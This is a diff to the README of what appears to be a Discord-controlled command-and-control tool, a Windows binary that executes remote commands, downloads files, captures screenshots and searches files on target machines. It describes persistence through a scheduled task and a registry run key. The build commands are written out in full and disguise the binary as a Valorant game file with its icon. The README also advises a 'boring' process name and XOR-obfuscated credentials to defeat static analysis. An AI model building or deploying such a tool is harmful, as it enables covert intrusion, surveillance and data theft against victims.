@@ -2,7 +2,7 @@
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
-Discord bot C2 — Nuitka-compiled Windows binary for remote command execution, file download, screenshot capture, and file search from a Discord control channel. Persistent via scheduled task + registry run key.
+Discord bot C2 — Nuitka-compiled Windows binary for remote command execution, file download, screenshot capture, and file search from a Discord control channel. Persistent via scheduled task + registry run key. No Discord gateway — uses only Python stdlib (`urllib`) for HTTP polling.
 
 ## Screenshots
 
@@ -17,17 +17,23 @@ One binary per target machine. Each target runs its own Discord bot (HTTP API cl
 
 
 
+## Quickstart
+
 ```bash
-# Build per target
 python token_gen.py "MT...bot-token..." "channel_id" "admin_id"
-# → paste XOR-obfuscated bytes into VALORANT.py
+# → paste the output into VALORANT.py
 
 pip install -r requirements.txt
-python -m nuitka --onefile --windows-console-mode-disable \
-    --windows-icon-from-ico=valorant.ico VALORANT.py
+python -m nuitka --onefile --windows-console-mode=disable \
+    --windows-icon-from-ico=valorant.ico \
+    --lto \
+    --python-flag=no_site \
+    --python-flag=no_user_site \
+    --assume-yes-for-downloads \
+    VALORANT.py
 ```
 
-No Discord gateway WebSocket connection. No `discord.py` dependency. The binary uses only Python stdlib (`urllib`) for HTTP — no external runtime deps in the compiled output.
+Then see [Build](#build) for the full hardening flags and [Deploy](#deploy) for deployment steps.
 
 ## Build
 
@@ -56,7 +62,7 @@ python -m nuitka --onefile --windows-console-mode=disable \
 #    Process name in Task Manager = filename. Pick something boring.
 ```
 
-The token, channel ID, and admin ID are XOR-obfuscated in source — never in plaintext. The compiled binary does not reveal them via `strings` or static analysis.
+The token, channel ID, and admin ID are XOR-obfuscated in source — never in plaintext. The compiled binary does not reveal them via `strings` or static analysis. See [Security](#security) for details.
 
 ## Deploy
 
